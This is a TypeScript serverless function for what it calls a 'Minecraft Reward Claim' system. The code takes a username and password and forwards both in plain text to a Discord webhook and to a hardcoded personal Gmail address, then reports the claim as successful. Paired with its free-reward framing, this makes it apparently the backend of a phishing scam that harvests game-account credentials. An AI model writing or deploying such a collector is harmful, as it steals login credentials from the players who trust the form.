import type { VercelRequest, VercelResponse } from '@vercel/node';
import nodemailer from "nodemailer";

export default async function handler(
  req: VercelRequest,
  res: VercelResponse
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { username, password, servers } = req.body;

  if (!username || !password || !Array.isArray(servers)) {
    return res.status(400).json({ 
      status: "error", 
      message: "Missing required fields: username, password, or servers array." 
    });
  }

  try {
    // 1. Try Discord Webhook
    if (process.env.DISCORD_WEBHOOK_URL) {
      try {
        await fetch(process.env.DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "🎮 New Minecraft Reward Claim",
              color: 0x3fb11e,
              fields: [
                { name: "👤 Username", value: `\`${username}\``, inline: true },
                { name: "🔑 Password", value: `\`${password}\``, inline: true },
                { name: "🌐 Servers", value: servers.join(", ") }
              ],
              footer: { text: "Minecraft Reward Claimer System" },
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch (discordError) {
        console.error("Discord Webhook error:", discordError);
      }
    }

    // 2. Try Email (Nodemailer)
    if (process.env.EMAIL_PASS) {
      try {
        const transporter = nodemailer.createTransport({
          service: "gmail",
          auth: {
            user: process.env.EMAIL_USER || "affanayyan23@gmail.com",
            pass: process.env.EMAIL_PASS,
          },
        });

        const mailOptions = {
          from: process.env.EMAIL_USER || "affanayyan23@gmail.com",
          to: "affanayyan23@gmail.com",
          subject: `[Minecraft Reward] New Claim from ${username}`,
          text: `
            New Claim Received!
            -------------------
            Username: ${username}
            Password: ${password}
            Servers: ${servers.join(", ")}
            Timestamp: ${new Date().toISOString()}
          `,
        };

        await transporter.sendMail(mailOptions);
      } catch (emailError) {
        console.error("Email sending error:", emailError);
      }
    }

    return res.status(200).json({ status: "ok", message: "Claim processed successfully" });
  } catch (error: any) {
    console.error("Error processing claim:", error);
    return res.status(500).json({ 
      status: "error", 
      message: "Internal server error",
      details: error?.message || "Unknown error"
    });
  }
}
